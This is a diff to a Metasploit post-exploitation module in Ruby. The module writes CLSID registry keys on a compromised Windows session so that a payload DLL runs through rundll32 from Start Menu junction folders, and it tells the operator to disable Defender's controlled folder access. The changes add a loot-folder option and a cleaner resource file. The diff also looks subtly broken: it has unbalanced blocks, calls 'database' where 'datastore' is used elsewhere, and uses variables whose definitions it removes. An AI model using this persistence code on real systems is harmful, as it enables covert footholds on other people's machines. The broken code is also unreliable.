@@ -27,6 +27,7 @@
 # The session number to run this module on           => set SESSION 3
 # The full path of the appl to run or payload        => set APPL_PATH C:\\Windows\\System32\\calc.exe
 # The full path and name of folder to create         => set FOLDER_PATH C:\\Users\\%username%\\Destop\\POC
+# The full path [local] were to store module logs    => set LOOT_FOLDER /root/.msf4/loot
 # Use explorer Start Menu to persiste our agent.dll? => set PERSIST_EXPLORER true
 # Rename ..\\Start Menu\\..\\Accessories.{GUID}?     => set RENAME_PERSIST true
 # ----------------------------------------------------------------------------------------------------
@@ -125,7 +126,8 @@ class MetasploitModule < Msf::Post
                                 ],
 			'DefaultOptions' =>
 				{
-                                         'SESSION' => '1',                                       # Default its to run againts session 1
+                                         'SESSION' => '1',                                       # run againts session 1
+                                         'LOOT_FOLDER' => '/root/.msf4/loot',                    # default logs storage directory
                                          'APPL_PATH' => '%windir%\\System32\\calc.exe',          # Default appl (payload) to run
                                          'FOLDER_PATH' => 'C:\\Users\\%username%\\Desktop\\POC', # Default folder path (demo)
 				},
@@ -137,7 +139,8 @@ class MetasploitModule < Msf::Post
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                 OptString.new('APPL_PATH', [ true, 'The full path of the appl to run or payload']),
-                                OptString.new('FOLDER_PATH', [ true, 'The full path and name of folder to create'])
+                                OptString.new('FOLDER_PATH', [ true, 'The full path and name of folder to create']),
+                                OptString.new('LOOT_FOLDER', [ true, 'The full path [local] were to store module logs'])
                         ], self.class)
 
                 register_advanced_options(
@@ -196,12 +199,12 @@ def run
       print_line("    Disable 'Controlled folder access' in Windows Defender")
       print_line("    If you wish to teste this on windows 10 version distros")
       print_line("-----------------------------------------------------------")
-      Rex::sleep(5.0)
+      Rex::sleep(6.0)
     end
 
 
   # variable declarations ..
-  app_path = datastore['APPL_PATH']    # %windir%\\System32\\calc.exe
+  app_path = datastore['APPL_PATH']   # %windir%\\System32\\calc.exe
   fol_path = datastore['FOLDER_PATH'] # C:\\Users\%username%\Desktop\POC
   hive_key = "HKCU\\Software\\Classes\\CLSID" # uac hive key (CLSID)
   #
@@ -273,7 +276,7 @@ def run
 
 
      #
-     # List of registry keys to add to target regedit .. rundll32.exe $N4m.dll,main
+     # List of registry keys to add to target regedit .. (rundll32.exe payload.dll,main)
      #
      if datastore['PERSIST_EXPLORER'] == true || datastore['RENAME_PERSIST'] == true
        dll_exe = "rundll32.exe #{app_path},main"
@@ -295,6 +298,7 @@ def run
 
 
        r=''
+       # loop funtion to execute a list of reg keys ..
        session.response_timeout=120
        hacks.each do |cmd|
           begin
@@ -338,37 +342,46 @@ def run
          end
 
 
+         #
+         # create cleaner resource file
+         #
+         print_status("Writing cleaner resource file ..")
+         loot_folder= database['LOOT_FOLDER']
+         Rex::sleep(1.0)
+
+           if datastore['PERSIST_EXPLORER'] == true
+             File.open("#{loot_folder}/Junction_cleaner.rc", "w") do |f|
+             f.write("reg delete \"#{hive_key}\\#{new_GUID}\" /f")
+             f.close
+           elsif datastore['RENAME_PERSIST'] == true
+             File.open("#{loot_folder}/Junction_cleaner.rc", "w") do |f|
+             f.write("reg delete \"#{hive_key}\\#{new_GUID}\" /f")
+             f.write("cmd.exe /c rename \"#{ren_per}.{new_GUID} #{ren_per}\"")
+             f.close
+           else
+             File.open("#{loot_folder}/Junction_cleaner.rc", "w") do |f|
+             f.write("reg delete \"#{hive_key}\\#{new_GUID}\" /f")
+             f.close
+           end 
+
+
        #
-       # exploit finished ..
+       # exploit finished (print info on screen)..
        #
+       print_good("Module execution finished ..")
        if datastore['PERSIST_EXPLORER'] == true
-         folder_poc ="#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC"
-         print_good("Module execution finished ..")
          print_line("-----------------------------------------------------------")
          print_line("    Trigger exploit: #{folder_poc}")
-         print_line("")
-         print_line("    To delete all changes made:")
-         print_line("    cmd.exe /c reg delete \"#{hive_key}\\#{new_GUID}\" /f")
          print_line("-----------------------------------------------------------")
          Rex::sleep(1.0)
        elsif datastore['RENAME_PERSIST'] == true
-         ren_per = "\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\""
-         print_good("Module execution finished ..")
          print_line("-----------------------------------------------------------")
          print_line("    Trigger exploit: #{ren_per}")
-         print_line("")
-         print_line("    To delete all changes made:")
-         print_line("    cmd.exe /c reg delete \"#{hive_key}\\#{new_GUID}\" /f")
-         print_line("    cmd.exe /c rename \"#{ren_per}.{new_GUID} #{ren_per}\"")
          print_line("-----------------------------------------------------------")
          Rex::sleep(1.0)
        else
-         print_good("Module execution finished ..")
          print_line("-----------------------------------------------------------")
          print_line("    Trigger exploit: #{fol_path}")
-         print_line("")
-         print_line("    To delete all changes made:")
-         print_line("    cmd.exe /c reg delete \"#{hive_key}\\#{new_GUID}\" /f")
          print_line("-----------------------------------------------------------")
          Rex::sleep(1.0)
        end
